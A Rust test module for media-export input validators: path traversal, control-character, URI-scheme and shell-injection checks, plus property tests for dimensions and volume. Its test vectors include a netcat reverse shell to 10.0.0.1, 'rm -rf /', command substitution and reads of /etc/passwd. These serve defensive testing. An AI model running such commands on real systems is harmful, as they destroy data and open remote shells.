#[cfg(test)]
mod tests {
    use proptest::prelude::*;
    use std::path::{Path, PathBuf};

    /// Sanitizes and validates a given file path to protect against path traversal attacks.
    /// Ensures paths do not contain null bytes, control characters, or relative escapes (`..`).
    pub fn sanitize_and_validate_path(raw_path: &str) -> Result<PathBuf, String> {
        // Null byte check
        if raw_path.contains('\0') {
            return Err("Security Violation: Path contains null bytes".into());
        }

        // Control characters check (\n, \r, \t, etc.)
        if raw_path.chars().any(|c| c.is_control()) {
            return Err("Security Violation: Path contains illegal control characters".into());
        }

        // Forbidden protocol schemes check
        let lower = raw_path.to_lowercase();
        if lower.starts_with("javascript:")
            || lower.starts_with("data:")
            || lower.starts_with("vbscript:")
        {
            return Err("Security Violation: Disallowed URI protocol scheme".into());
        }

        // Path normalization check (handle both POSIX / and Windows \ separators cross-platform)
        let normalized = raw_path.replace('\\', "/");
        let path = Path::new(&normalized);
        for component in path.components() {
            if component == std::path::Component::ParentDir || component.as_os_str() == ".." {
                return Err("Security Violation: Path traversal '..' detected".into());
            }
        }


        Ok(path.to_path_buf())
    }

    /// Sanitizes command arguments intended for shell / process spawning (e.g., FFmpeg).
    pub fn sanitize_shell_arg(arg: &str) -> Result<String, String> {
        // Prevent command injection characters
        if arg.contains(';')
            || arg.contains('|')
            || arg.contains('&')
            || arg.contains('`')
            || arg.contains('$')
            || arg.contains('<')
            || arg.contains('>')
            || arg.contains('\n')
            || arg.contains('\r')
        {
            return Err("Security Violation: Argument contains potential shell injection tokens".into());
        }
        Ok(arg.to_string())
    }

    /// Validates audio volume level (0.0 to 10.0 max safety margin).
    pub fn validate_audio_volume(volume: f64) -> Result<f64, String> {
        if volume.is_nan() || volume.is_infinite() {
            return Err("Invalid volume: NaN or Infinity".into());
        }
        if volume < 0.0 || volume > 10.0 {
            return Err(format!("Volume out of bounds: {}", volume));
        }
        Ok(volume)
    }

    /// Validates spatial dimensions (width, height, fps).
    pub fn validate_export_dimensions(w: u32, h: u32, fps: u32) -> Result<(), String> {
        if w == 0 || h == 0 {
            return Err("Export dimensions cannot be zero".into());
        }
        if w > 15360 || h > 8640 {
            return Err("Export dimensions exceed 16K max safety ceiling".into());
        }
        if fps == 0 || fps > 480 {
            return Err(format!("FPS out of bounds: {}", fps));
        }
        Ok(())
    }

    // ==========================================
    // SECURITY PATH TRAVERSAL UNIT TESTS
    // ==========================================

    #[test]
    fn test_rejects_path_traversal_parent_dir() {
        let malicious_paths = vec![
            "../etc/passwd",
            "../../secret.json",
            "videos/../../hidden",
            "C:\\Windows\\..\\System32",
            "/var/app/storage/../../../root",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected path traversal path: {}",
                path
            );
        }
    }

    #[test]
    fn test_rejects_null_byte_injection() {
        let malicious_paths = vec![
            "export.mp4\0.exe",
            "safe_image.png\0/../../etc/shadow",
            "\0malicious",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected null byte path: {}",
                path
            );
        }
    }

    #[test]
    fn test_rejects_control_characters() {
        let malicious_paths = vec![
            "export\nvideo.mp4",
            "media\r/file.mov",
            "track\tname.wav",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected control char path: {}",
                path
            );
        }
    }

    #[test]
    fn test_rejects_malicious_uri_schemes() {
        let malicious_paths = vec![
            "javascript:alert(1)",
            "data:text/html,<script>evil()</script>",
            "vbscript:msgbox",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected malicious scheme: {}",
                path
            );
        }
    }

    #[test]
    fn test_accepts_valid_safe_paths() {
        let safe_paths = vec![
            "/Users/dev/Videos/my_project.mp4",
            "C:\\Users\\dev\\Videos\\render.mov",
            "relative/path/to/media.png",
            "my-video_1080p.mp4",
        ];

        for path in safe_paths {
            assert!(
                sanitize_and_validate_path(path).is_ok(),
                "Should have accepted safe path: {}",
                path
            );
        }
    }

    // ==========================================
    // SHELL INJECTION DEFENSE TESTS
    // ==========================================

    #[test]
    fn test_rejects_shell_injection_tokens() {
        let injection_args = vec![
            "video.mp4; rm -rf /",
            "output.mov | nc -e /bin/sh 10.0.0.1 4444",
            "clip.wav & echo hacked",
            "$(whoami).mp4",
            "`id`.mov",
            "input.mp4 > /dev/null",
            "input.mp4 < /etc/passwd",
        ];

        for arg in injection_args {
            assert!(
                sanitize_shell_arg(arg).is_err(),
                "Should have rejected shell injection attempt: {}",
                arg
            );
        }
    }

    #[test]
    fn test_accepts_valid_ffmpeg_args() {
        let valid_args = vec![
            "-c:v",
            "libx264",
            "-preset",
            "fast",
            "-crf",
            "18",
            "yuv420p",
            "complex_filter_scale=1920:1080",
        ];

        for arg in valid_args {
            assert!(
                sanitize_shell_arg(arg).is_ok(),
                "Should have accepted valid FFmpeg arg: {}",
                arg
            );
        }
    }

    // ==========================================
    // PROPTEST PROPERTY-BASED TESTS
    // ==========================================

    proptest! {
        #[test]
        fn proptest_dimension_validation(w in 0u32..20000u32, h in 0u32..20000u32, fps in 0u32..600u32) {
            let res = validate_export_dimensions(w, h, fps);
            if w == 0 || h == 0 || w > 15360 || h > 8640 || fps == 0 || fps > 480 {
                prop_assert!(res.is_err());
            } else {
                prop_assert!(res.is_ok());
            }
        }

        #[test]
        fn proptest_audio_volume_validation(vol in -100.0f64..200.0f64) {
            let res = validate_audio_volume(vol);
            if vol.is_nan() || vol.is_infinite() || vol < 0.0 || vol > 10.0 {
                prop_assert!(res.is_err());
            } else {
                prop_assert!(res.is_ok());
            }
        }
    }
}
